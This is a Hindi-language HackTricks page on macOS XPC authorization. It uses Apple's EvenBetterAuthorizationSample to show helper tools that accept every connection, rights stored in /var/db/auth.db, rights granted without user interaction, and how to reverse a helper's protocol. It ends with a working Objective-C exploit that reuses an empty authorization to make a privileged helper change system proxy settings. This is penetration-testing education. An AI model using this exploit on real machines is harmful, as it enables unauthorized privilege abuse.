# macOS XPC अधिकृतता

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप किसी **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS की नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करने की इच्छा है? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>

## XPC अधिकृतता

एप्पल ने भी एक और तरीका प्रस्तावित किया है जिससे पता लगाया जा सकता है कि कनेक्ट करने वाली प्रक्रिया को **अनुमति है कि क्या एक उभरता हुआ XPC विधि को कॉल करने की** अनुमति है।

जब एक एप्लिकेशन को **विशेषाधिकारी उपयोगकर्ता के रूप में कार्रवाई करनी होती है**, तो एक उभरता हुई सेवा के रूप में एक HelperTool को रूट के रूप में स्थापित करने के बजाय, आमतौर पर ऐप को उन कार्रवाइयों को करने के लिए कॉल करने के लिए एक XPC सेवा के रूप में कॉल किया जा सकता है। हालांकि, सेवा को कॉल करने वाले ऐप को पर्याप्त अधिकृतता होनी चाहिए।

### ShouldAcceptNewConnection हमेशा YES

एक उदाहरण [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample) में मिल सकता है। `App/AppDelegate.m` में यह **HelperTool** से **कनेक्ट** करने का प्रयास करता है। और `HelperTool/HelperTool.m` में फ़ंक्शन **`shouldAcceptNewConnection`** किसी भी पूर्व निर्दिष्ट आवश्यकताओं की जांच नहीं करेगा। यह हमेशा YES लौटाएगा:
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
इस जांच को सही ढंग से कैसे कॉन्फ़िगर करने के बारे में अधिक जानकारी के लिए:

{% content-ref url="macos-xpc-connecting-process-check/" %}
[macos-xpc-connecting-process-check](macos-xpc-connecting-process-check/)
{% endcontent-ref %}

### एप्लिकेशन अधिकार

हालांकि, **HelperTool से एक मेथड को कॉल करते समय कुछ अधिकृतता होती है**।

`App/AppDelegate.m` से **`applicationDidFinishLaunching`** फ़ंक्शन एप्लिकेशन शुरू होने के बाद एक खाली अधिकृतता संदर्भ बनाएगा। यह हमेशा काम करना चाहिए।
फिर, यह उस अधिकृतता संदर्भ में कुछ अधिकार जोड़ने का प्रयास करेगा, `setupAuthorizationRights` को कॉल करके:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
फ़ंक्शन `Common/Common.m` में से `setupAuthorizationRights` अनुप्रयोग के द्वारा अधिकारों को `/var/db/auth.db` ऑथ डेटाबेस में संग्रहीत किया जाएगा। ध्यान दें कि यह केवल उन अधिकारों को ही जो डेटाबेस में अभी तक नहीं हैं, जोड़ेगा:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
फ़ंक्शन `enumerateRightsUsingBlock` उसे किया जाता है ताकि अनुप्रयोगों की अनुमतियाँ प्राप्त की जा सकें, जो `commandInfo` में परिभाषित होती हैं:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
इसका मतलब है कि इस प्रक्रिया के अंत में, `commandInfo` में घोषित अनुमतियाँ `/var/db/auth.db` में संग्रहीत होंगी। ध्यान दें कि वहां आपको **प्रत्येक विधि** के लिए जो **प्रमाणीकरण की आवश्यकता होगी**, **अनुमति का नाम** और **`kCommandKeyAuthRightDefault`** मिलेगा। इसका अंतिम एक **यह दर्शाता है कि यह अधिकार किसे प्राप्त कर सकता है**।

एक अधिकार तक पहुंच करने वाले व्यक्ति को दर्शाने के लिए विभिन्न दायरे हैं। इनमें से कुछ [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity\_authorization/lib/AuthorizationDB.h) में परिभाषित हैं (आप [इनमें से सभी को यहां पा सकते हैं](https://www.dssw.co.uk/reference/authorization-rights/)), लेकिन सारांश में:

<table><thead><tr><th width="284.3333333333333">नाम</th><th width="165">मान</th><th>विवरण</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>अनुमति</td><td>कोई भी</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>निषेध</td><td>कोई नहीं</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>वर्तमान उपयोगकर्ता को एडमिन होना चाहिए (एडमिन समूह में)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>उपयोगकर्ता सत्यापित करने के लिए कहें।</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>उपयोगकर्ता सत्यापित करने के लिए कहें। उसे एडमिन होना चाहिए (एडमिन समूह में)</td></tr><tr><td>kAuthorizationRightRule</td><td>नियम</td><td>नियम निर्दिष्ट करें</td></tr><tr><td>kAuthorizationComment</td><td>टिप्पणी</td><td>अधिकार पर कुछ अतिरिक्त टिप्पणियाँ निर्दिष्ट करें</td></tr></tbody></table>

### अधिकार सत्यापन

`HelperTool/HelperTool.m` में फ़ंक्शन **`readLicenseKeyAuthorization`** यह जांचता है कि कॉलर को **ऐसी विधि को निष्पादित करने की** अनुमति है या नहीं, फ़ंक्शन **`checkAuthorization`** को कॉल करके। यह फ़ंक्शन **आवंटित डेटा** की सही प्रारूप में है या नहीं जांचेगा और फिर **उसे क्या चाहिए अधिकार प्राप्त करने के लिए** वह जांचेगा। अगर सब कुछ ठीक होता है तो **वापसी की गई `त्रुटि` शून्य होगी**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
नोट करें कि उस विधि को बुलाने के लिए अधिकार प्राप्त करने के लिए आवश्यकताओं की जांच करने के लिए फ़ंक्शन `authorizationRightForCommand` बस पहले टिप्पणी वस्तु **`commandInfo`** की जांच करेगा। फिर, यह विधि बुलाने के लिए अधिकार हैं या नहीं जांचने के लिए **`AuthorizationCopyRights`** को बुलाएगा (ध्यान दें कि फ़्लैग्स उपयोगकर्ता के साथ इंटरैक्शन की अनुमति देते हैं)।

इस मामले में, विधि `readLicenseKeyAuthorization` को बुलाने के लिए `kCommandKeyAuthRightDefault` को `@kAuthorizationRuleClassAllow` के रूप में परिभाषित किया गया है। इसलिए **कोई भी इसे बुला सकता है**।

### डीबी जानकारी

यह उल्लेख किया गया था कि यह जानकारी `/var/db/auth.db` में संग्रहीत होती है। आप इसके सभी संग्रहीत नियमों की सूची देख सकते हैं:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
तब आप यह पढ़ सकते हैं कि कौन अधिकार का उपयोग कर सकता है:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### अनुमतियों का अनुमति

आप **यहां सभी अनुमति कॉन्फ़िगरेशन** [**यहां**](https://www.dssw.co.uk/reference/authorization-rights/) मिल सकती हैं, लेकिन उन संयोजनों में से जो उपयोगकर्ता संवाद की आवश्यकता नहीं करेंगे, वे होंगे:

1. **'authenticate-user': 'false'**
* यह सबसे सीधी कुंजी है। यदि इसे `false` पर सेट किया जाता है, तो इसका अर्थ होता है कि उपयोगकर्ता को इस अधिकार को प्राप्त करने के लिए प्रमाणीकरण प्रदान करने की आवश्यकता नहीं होती है।
* इसे **नीचे दिए गए 2 में से किसी एक के साथ या उपयोगकर्ता के समूह की घोषणा करने के साथ** उपयोग किया जाता है।
2. **'allow-root': 'true'**
* यदि एक उपयोगकर्ता रूट उपयोगकर्ता के रूप में कार्य कर रहा है (जिसमें उच्चतर अनुमतियाँ होती हैं), और यह कुंजी `true` पर सेट की जाती है, तो रूट उपयोगकर्ता इस अधिकार को और प्रमाणीकरण के बिना प्राप्त कर सकता है। हालांकि, आमतौर पर, एक रूट उपयोगकर्ता स्थिति तक पहुंचने के लिए पहले से ही प्रमाणीकरण की आवश्यकता होती है, इसलिए यह अधिकांश उपयोगकर्ताओं के लिए "कोई प्रमाणीकरण नहीं" स्थिति नहीं है।
3. **'session-owner': 'true'**
* यदि इसे `true` पर सेट किया जाता है, तो सत्र के मालिक (वर्तमान में लॉग इन किए गए उपयोगकर्ता) को यह अधिकार स्वचालित रूप से प्राप्त होगा। यदि उपयोगकर्ता पहले से ही लॉग इन है, तो यह अतिरिक्त प्रमाणीकरण को छोड़ सकता है।
4. **'shared': 'true'**
* यह कुंजी प्रमाणीकरण के बिना अधिकार प्रदान नहीं करती है। बजाय इसके, यदि इसे `true` पर सेट किया जाता है, तो इसका अर्थ होता है कि एक बार अधिकार प्रमाणीकृत हो जाने के बाद, इसे कई प्रक्रियाओं के बीच साझा किया जा सकता है बिना प्रत्येक प्रक्रिया को पुनः प्रमाणीकृत करने की आवश्यकता होती है। लेकिन अधिकार की प्रारंभिक प्रदान करने के लिए प्रमाणीकरण की आवश्यकता होगी, यहां तक कि यह `'authenticate-user': 'false'` जैसी अन्य कुंजियों के साथ संयुक्त नहीं हो।

आप [**इस स्क्रिप्ट का उपयोग कर सकते हैं**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) दिलचस्प अधिकार प्राप्त करने के लिए:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
## अधिकृती का उल्टा करना

### जांचें कि क्या EvenBetterAuthorization का उपयोग हो रहा है

यदि आपको फ़ंक्शन मिलता है: **`[HelperTool checkAuthorization:command:]`**, तो संभवतः प्रक्रिया पहले उल्लिखित अधिकृती के लिए योजना का उपयोग कर रही है:

<figure><img src="../../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

इसके बाद, यदि इस फ़ंक्शन को `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights`, `AuhtorizationFree` जैसी फ़ंक्शन को कॉल कर रहा है, तो यह [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154) का उपयोग कर रही है।

अधिकृत कार्रवाई को उपयोगकर्ता संवाद के बिना कॉल करने की अनुमति मिलने के लिए **`/var/db/auth.db`** की जांच करें।

### प्रोटोकॉल संवाद

फिर, आपको XPC सेवा के साथ संवाद स्थापित करने के लिए प्रोटोकॉल योजना खोजनी होगी।

फ़ंक्शन **`shouldAcceptNewConnection`** प्रोटोकॉल को निर्यात करने की संकेत देता है:

<figure><img src="../../../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

इस मामले में, हम EvenBetterAuthorizationSample में जो भी है, [**इस लाइन की जांच करें**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94)।

उपयोग की जाने वाली प्रोटोकॉल का नाम जानने के बाद, आप इसकी हेडर परिभाषा को **डंप कर सकते हैं**:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
अंत में, हमें केवल इसके साथ संचार स्थापित करने के लिए **बेनक़ाब मैक सेवा का नाम** पता होना चाहिए। इसे ढूंढने के कई तरीके हैं:

* **`[HelperTool init()]`** में, जहां आप मैक सेवा का उपयोग होते हुए देख सकते हैं:

<figure><img src="../../../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

* launchd plist में:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### उदाहरण शोषण

इस उदाहरण में निम्नलिखित बनाया गया है:

* फ़ंक्शन के साथ प्रोटोकॉल की परिभाषा
* पहुँच के लिए उपयोग करने के लिए एक खाली प्रमाणीकरण
* XPC सेवा के लिए एक कनेक्शन
* कॉल फ़ंक्शन को यदि कनेक्शन सफल रहा है
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## संदर्भ

* [https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/](https://theevilbit.github.io/posts/secure\_coding\_xpc\_part1/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **हैकट्रिक्स में विज्ञापित** देखना चाहते हैं? या क्या आप **PEASS के नवीनतम संस्करण का उपयोग करना चाहते हैं या HackTricks को PDF में डाउनलोड करना चाहते हैं**? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह,
* प्राप्त करें [**आधिकारिक PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें और PRs सबमिट करें** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
